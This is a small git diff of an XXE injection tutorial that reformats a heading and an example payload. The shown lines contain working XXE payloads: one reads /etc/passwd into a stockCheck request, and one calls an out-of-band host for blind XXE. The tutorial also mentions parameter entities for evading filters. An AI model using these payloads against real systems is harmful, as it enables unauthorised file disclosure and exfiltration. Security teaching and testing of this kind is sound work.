@@ -12,7 +12,7 @@ Keep in mind that XML is just a data transfer format. Make sure you also test an
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://zhkjg0n2ikpienyuf43fiyvuelkc82wr.oastify.com"> ]>  >> For Blind xxe attack.
 &xxe;
 ```
-####Example:
+#### Example:
 Before Injection:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -28,7 +28,15 @@ Before Injection:
 After Injection:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+    <stockCheck>
+        <productId>
+            &xxe;
+        </productId>
+        <storeId>
+            1
+        </storeId>
+    </stockCheck>
 ```
 Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead.
 ```xml
